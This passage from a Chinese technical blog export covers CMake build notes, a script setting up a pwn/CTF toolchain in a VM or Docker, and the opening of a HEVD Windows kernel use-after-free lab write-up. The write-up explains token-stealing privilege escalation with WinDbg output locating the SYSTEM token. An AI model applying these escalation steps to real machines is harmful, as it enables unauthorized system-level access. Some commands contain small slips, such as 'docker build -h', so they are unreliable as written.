class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>
<h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><ul>
<li>Linux 命令行，cmake <strong>生成 makefile</strong>，然后在 make 生成可执行文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows 命令行</li>
</ul>
<ol>
<li>MinGW 环境，不是我的选择，因为由 MSVC</li>
<li>CMake，首先生成缓存，最后编译</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure>

<ul>
<li>配合 VsCode 使用</li>
</ul>
<p>Ctrl + shift + p 进入命令 ： cmake build 就能生成build 目录，出现我们的需要的exe文件</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li>最简单的 CmakeLists</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ cmake 版本要求 ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 工程名 ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 可执行文件 ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure>

<ul>
<li>set 设置变量</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>C&#x2F;C++ 标准 比如 <code>-std=c99</code></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>file</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 匹配所有的文件名 ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 将 /usr/lib/inlcude/ 下所有 c文件 赋值给 SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure>

<ul>
<li>宏</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 当前CMakeLists所在文件夹 ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 最外层CMakeLists.txt所在目录 ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 离 CMakeLists.txt 最近的一层文件夹 ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 二进制文件输出路径，可自行set ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 库输出路径 ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 编译器编译选项 ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure>

<ul>
<li>打印信息</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure>

<ul>
<li>制作链接库</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC(静态库) SHARED(动态库) MODULE(模块库) ]]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>添加库，类似于 <code>gcc -lpthread</code></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure>

<h3 id="多文件夹"><a href="#多文件夹" class="headerlink" title="多文件夹"></a>多文件夹</h3><ul>
<li>包含头文件</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>包含源文件：file</p>
</li>
<li><p>多个可执行文件，比如简单的 web 服务器</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">|	|-- client.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">|	|-- server.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure>


<ul>
<li>添加子目录，要求子目录必须含有 CmakeLists.txt</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 包含子目录 ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure>

<ul>
<li>最外层</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure>

<ul>
<li>clent &amp; server</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure>

<h3 id="编译成库"><a href="#编译成库" class="headerlink" title="编译成库"></a>编译成库</h3><ul>
<li>将include编译成库，然后在编译时指定库 (packet: 网络数据包，在client 和 server 都会使用)</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure>

<ul>
<li>项目添加动态链接库：包含库 + 二进制文件链接</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure>

<h3 id="添加cpp文件"><a href="#添加cpp文件" class="headerlink" title="添加cpp文件"></a>添加cpp文件</h3><ul>
<li>或许最简单，我们也可以使用其他的宏和函数获取cpp文件添加</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure>

<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote>
<p>主要是在 vscode 中配合 LLVM 工具链进行debug。~~CLion 啥都有🫢 ~~</p>
</blockquote>
<p>环境：vscode + llvm + clangd插件 + code-lldb插件</p>
<ul>
<li>写好一个cmake工程</li>
</ul>
<p>f5 进行调试，需要文件夹下有一个 <code>.vscode</code> 文件夹，配置<code>launch.json</code>。其中有一个属性：<code>program</code> 修改为我们的生成的二进制文件就行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<ul>
<li>lldb 指令和 gdb 类似，我们可以在下面的 debug 窗口 进行单步执行</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn init</title>
    <url>/2023/06/05/Pwn%20init/</url>
    <content><![CDATA[<blockquote>
<p>搭建一个pwn环境。</p>
</blockquote>
<span id="more"></span>

<ul>
<li><code>apt</code> or <code>apt-get</code>? 虽然我使用apt出现warning,但是依然能用<ul>
<li>在脚本中，更加推荐 <code>apt-get</code></li>
<li><code>-y</code> yes 避免交互而产生错误</li>
</ul>
</li>
</ul>
<h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote>
<p>安装必备的应用</p>
</blockquote>
<ul>
<li>root下使用，但是普通用户无法使用<code>gdb插件</code>功能，因为gdbinit文件的位置，我们可以复制一份到自己的用户目录下</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># python工具</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem源</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul>
<li><p>搭建更加容易</p>
</li>
<li><p>由于某些题目没有Libc版本，而是给出了Dockerfile。或者说，不想下载虚拟机。</p>
<ul>
<li>glibc-all-in-one 下载一个libc 进行patch(但是<code>patchelf</code>容易导致程序破坏).</li>
<li>自己的docker环境</li>
</ul>
</li>
<li><p>docker环境搭建: 更改VERSION就行，禁止交互。</p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure>

<ul>
<li>pwninit: 只需要安装部分工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f 指定dockerfile</span></span><br><span class="line"><span class="comment"># repo 形式 xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<ul>
<li>进入docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir 共享文件夹</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>docker 命令</p>
<ul>
<li>-i: 交互式</li>
<li>-t: terminl</li>
<li>-v hostDir:dockerDir 共享文件夹</li>
<li>ps -a: 查看所有的容器</li>
</ul>
</li>
<li><p>停止后重新计入容器</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>停止容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<h4 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h4><ul>
<li>error 1</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure>

<ul>
<li>error 2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>出现了如上错误。寻找到一个<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p>
</li>
<li><p>error1，修改dockerfile的类似如下变量。选择中国</p>
</li>
<li><p>error2  也解决了。</p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们的设置</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><ul>
<li>创建多个docker。</li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD UAF</title>
    <url>/2024/02/07/HEVD%20UAF/</url>
    <content><![CDATA[<blockquote>
<p>Windows Kernel NonPagedPool UAF</p>
</blockquote>
<span id="more"></span>

<h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><p>运行<code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p>
<p>或者VS打开项目，编译。</p>
<ul>
<li>属性-&gt;DriverSetting 先设置为win7&#x2F;win10，生成x64</li>
</ul>
<h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code> 是一个用于在Windows内核开发中指定函数所属代码段属性的编译指令。</p>
<ul>
<li><code>#pragma alloc_text</code> 是一个预处理指令，用于在编译时将函数指定到特定的代码段。</li>
<li><code>PAGE</code> 是<code>#pragma alloc_text</code> 指令后面的参数，用于指定函数所属的代码段。<code>PAGE</code> 表示该函数应该被编译为适用于页码页面的代码段。</li>
</ul>
<p>ExAllocatePoolWithTag: 分配指定类型的池内存，并返回指向已分配块的指针</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span class="comment">// 要分配的池内存的类型，POOL_TYPE 枚举</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,    <span class="comment">// 要分配的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag               <span class="comment">// 要用于已分配内存的池标记，字符串通常按反向顺序指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure>

<p>windows 内存管理器创建系统用于分配内存的以下内存池：非分页池和分页池。 这两个内存池都位于为系统保留并映射到每个进程的虚拟地址空间的地址空间区域中。内核池类似于Windows 中的堆, 因为它的作用也是用来动态分配内存</p>
<ul>
<li>非分页池由虚拟内存地址组成，只要分配了相应的内核对象，这些地址就保证驻留在物理内存中。 </li>
<li>分页池由虚拟内存组成，可以分页进出系统。</li>
<li><strong>PagedPool</strong>简单来说就是物理内存不够时，会把这片内存移动到硬盘上，而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。</li>
</ul>
<p>ExFreePoolWithTag: 释放池内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExFreePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID P,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>NtAllocateReserveObject：ntdll中系统调用。负责在内核端创建保留对象–在内核池上执行内存分配，返回Handle</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS STDCALL <span class="title">NtAllocateReserveObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE hObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN DWORD ObjectType </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="驱动层权限提升"><a href="#驱动层权限提升" class="headerlink" title="驱动层权限提升"></a>驱动层权限提升</h2><p>内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p>
<p>Windows提权：获取 <code>nt authority\system</code>权限</p>
<ul>
<li>将SYSTEM进程的token复制到当前进程，这样当前进程则为system权限<a href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a>。</li>
<li>编辑ACL&#x2F;ACE 或者 直接修改token中的<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了<a href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>win10 22h2</p>
<p>首先找到System进程的16进制地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !dml_proc</span><br><span class="line">Address           PID  Image file name</span><br><span class="line">ffff940f`cfea7080 4    System</span><br><span class="line">...</span><br><span class="line">ffff940f`d7240080 2270 cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffff940fcfea7080</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>

<p>它指向一个<code>_EPROCESS</code>结构，查看，一个比较大的结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffff940f`cfea7080</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : 0x00000000`00000004 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   ...</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>可以看到token偏移（根据系统进行变化，并且token字段是以<code>_EX_FAST_REF</code>来声明的而不是<code>_TOKEN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dq ffffe78dfac04800+4b8 L1</span><br><span class="line">ffffe78d`fac04cb8  ffffe78d`fac0c05e</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br></pre></td></tr></table></figure>

<p>蓝屏警告：这个 <code>token</code> 后四位全为0才是token</p>
